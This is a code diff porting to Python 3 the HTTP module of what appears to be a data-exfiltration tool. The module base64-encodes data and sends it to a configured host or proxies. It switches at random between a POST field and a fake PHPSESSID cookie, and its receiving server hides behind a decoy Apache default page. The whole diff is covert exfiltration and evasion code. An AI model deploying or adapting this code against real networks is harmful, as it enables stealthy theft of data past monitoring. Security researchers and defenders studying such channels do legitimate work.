@@ -1,10 +1,10 @@
-from __future__ import print_function
 import requests
 import base64
-from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
-import urllib
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
 from random import choice
 import platform
+import traceback
 
 host_os = platform.system()
 
@@ -18,7 +18,7 @@ else:
 headers = requests.utils.default_headers()
 headers.update({'User-Agent': user_agent})
 
-with open('plugins/misc/default_apache_page.html', 'r') as html_file:
+with open('plugins/misc/default_apache_page.html', 'rb') as html_file:
     html_content = html_file.read()
 
 config = None
@@ -36,12 +36,12 @@ class S(BaseHTTPRequestHandler):
 
     def do_POST(self):
         self._set_headers()
-        content_len = int(self.headers.getheader('content-length', 0))
+        content_len = int(self.headers.get('content-length', 0))
         post_body = self.rfile.read(content_len)
-        tmp = post_body.split('=', 1)
+        tmp = post_body.decode().split('=', 1)
         if tmp[0] == "data":
             try:
-                data = base64.b64decode(urllib.unquote(tmp[1]))
+                data = base64.b64decode(urllib.parse.unquote(tmp[1]).encode())
                 self.server.handler(data)
             except Exception as e:
                 print(e)
@@ -50,39 +50,43 @@ class S(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
             string = '/'.join(self.path.split('/')[1:])
+            if len(string.strip()) == 0: 
+                raise Exception
             self._set_headers()
             try:
-                data = base64.b64decode(string)
-                app_exfiltrate.retrieve_data(data)
+                data = base64.b64decode(string.encode())
+                #app_exfiltrate.retrieve_data(data)
+                self.server.handler(data)
             except Exception as e:
+                print(e)
                 pass
-        except:
+        except Exception:
             self._set_headers()
-            if self.headers.has_key('Cookie'):
+            if 'Cookie' in self.headers:
                 cookie = self.headers['Cookie']
                 string = cookie.split('=', 1)[1].strip()
                 try:
-                    data = base64.b64decode(string)
-                    app_exfiltrate.retrieve_data(data)
+                    data = base64.b64decode(string.encode())
+                    #app_exfiltrate.retrieve_data(data)
                     self.server.handler(data)
                 except Exception as e:
                     print(e)
                     pass
 
 def send(data):
-    if config.has_key('proxies') and config['proxies'] != [""]:
+    if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
-    	target = "http://{}:{}".format(choice(targets), config['port'])
+        target = "http://{}:{}".format(choice(targets), config['port'])
     else:
-    	target = "http://{}:{}".format(config['target'], config['port'])
+        target = "http://{}:{}".format(config['target'], config['port'])
     app_exfiltrate.log_message(
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
     #Randomly choose between GET and POST
     if choice([True, False]):
-        data_to_send = {'data': base64.b64encode(data)}
+        data_to_send = {'data': base64.b64encode(data.encode()).decode()}
         requests.post(target, data=data_to_send, headers=headers)
     else:
-        cookies = dict(PHPSESSID=base64.b64encode(data))
+        cookies = dict(PHPSESSID=base64.b64encode(data.encode()).decode())
         requests.get(target, cookies=cookies, headers=headers)
 
 def relay_http_request(data):
@@ -91,10 +95,10 @@ def relay_http_request(data):
         'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
     #Randomly choose between GET and POST
     if choice([True, False]):
-        data_to_send = {'data': base64.b64encode(data)}
+        data_to_send = {'data': base64.b64encode(data.encode()).decode()}
         requests.post(target, data=data_to_send, headers=headers)
     else:
-        cookies = dict(PHPSESSID=base64.b64encode(data))
+        cookies = dict(PHPSESSID=base64.b64encode(data.encode()).decode())
         requests.get(target, cookies=cookies, headers=headers)
 
 def server(data_handler):
